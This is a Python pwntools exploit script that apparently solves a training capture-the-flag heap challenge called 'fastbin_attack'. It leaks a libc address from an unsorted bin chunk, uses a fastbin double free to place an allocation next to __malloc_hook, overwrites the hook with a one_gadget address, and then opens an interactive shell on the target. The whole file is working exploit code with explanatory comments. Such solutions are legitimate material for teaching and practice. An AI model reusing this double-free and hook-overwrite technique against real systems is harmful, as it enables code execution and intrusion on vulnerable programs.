from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./fastbin_attack")
    gdb.attach(r, """
            # b *0x00401255
            c
            """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 10101)

# Definition of functions


def alloc(r, size):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(str(size).encode())


def write(r, index, data):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(str(index).encode())
    r.recvuntil(b"Content: ")
    r.send(data)


def read(r, index):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(str(index).encode())
    return r.recvuntil(b"\nOptions:").split(b"\nOptions:")[0]


def free(r, index):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(str(index).encode())


# Test the functions
'''print(alloc(0x10))
print(alloc(0x10))
print(alloc(0x10))
write(O, b"A"*0x10)
print(read(0))
free(0)
print(read(0))'''

# Leak libc
LIBC_OFFSET = 0x3c4b78  # Offset of the libc in the unsorted bin
# Offset of the __malloc_hook in the unsorted bin (pointer to the __malloc_hook minus the offset of the libc in the unsorted bin (vmmap))
MALLOCHOOKS_OFFSET = 0x3c4b10
LIBC = ELF("./libc-2.23.so")  # Load the libc

alloc(r, 0x100)
alloc(r, 0x20)
free(r, 0)
leak = read(r, 0)  # Pointer of a chunk in the unsorted bin
# leak = u64(leak.ljust(8, b"\x00")) # Convert the pointer to an integer
# Calculate the base of libc (in vvmmap)
LIBC.address = u64(leak.ljust(8, b"\x00")) - LIBC_OFFSET

# libc_base = leak - LIBC_OFFSET # Calculate the base of libc (in vvmmap)
# print("libc_base: %s" % hex(libc_base))

# Fastbin attack
alloc(r, 0x60)  # index 2 (chunk 2)
alloc(r, 0x60)  # index 3 (chunk 3)
free(r, 2)  # free chunk 2
free(r, 3)  # free chunk 3
free(r, 2)  # free chunk 2
alloc(r, 0x60)  # index 4 (chunk 4)
# write (r, 4, p64(0x4141414141414141)) # Overwrite the fd of the chunk 2 with the address of the chunk 3
# Overwrite the fd of the chunk 2 with the address of the chunk 3 ( 0x23 is the offset calculated subtracting the offset of the __malloc_hook (seen in x/50gx) from the offset of the place where the shellcode will be written (seen in x/50gx) )
write(r, 4, p64(LIBC.symbols["__malloc_hook"] - 0x23))
alloc(r, 0x60)  # index 5 (chunk 5)
alloc(r, 0x60)  # index 6 (chunk 6)

# Overrite the __malloc_hook with the address of the shellcode
alloc(r, 0x60)  # index 7 (chunk 7)
# Overwrite the __malloc_hook with the address of the shellcode ( 0xf1247 is the magic number of the one_gadget )
write(r, 7, b"\x90"*0x13 + p64(LIBC.address + 0xf1247))

r.interactive()
